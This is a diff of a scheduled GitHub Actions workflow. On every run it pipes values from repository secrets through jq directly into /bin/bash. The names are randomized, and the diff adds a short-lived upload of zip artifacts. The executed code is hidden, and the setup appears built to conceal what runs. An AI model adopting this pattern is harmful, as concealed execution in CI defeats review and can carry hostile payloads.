@@ -1,21 +1,25 @@
 name: huanhuijiren
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '21 1/6 * * *'
-jobs:  # 18413
+    - cron: '51 0,6,12,18 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: huanhuijiren
         env:
-          n4239: ${{ secrets.n4239 }}
+          nu74169: ${{ secrets.nu74169 }}
         run: |
-          echo $n4239 | jq -r .oed18817 | /bin/bash
-          echo $w563 | jq -r .cs7 | /bin/bash
-          echo $laatb7 | jq -r .h43325 | /bin/bash
-          echo $ofeb13071 | jq -r .zfaww4159 | /bin/bash
+          printf '%s' "$nu74169" | jq -r .lsy93039 | /bin/bash
+          echo $qxz76 | jq -r .q2 | /bin/bash
+          echo $b645 | jq -r .d659 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: FJOyWpGl
+          path: "*.zip"
+          retention-days: 1
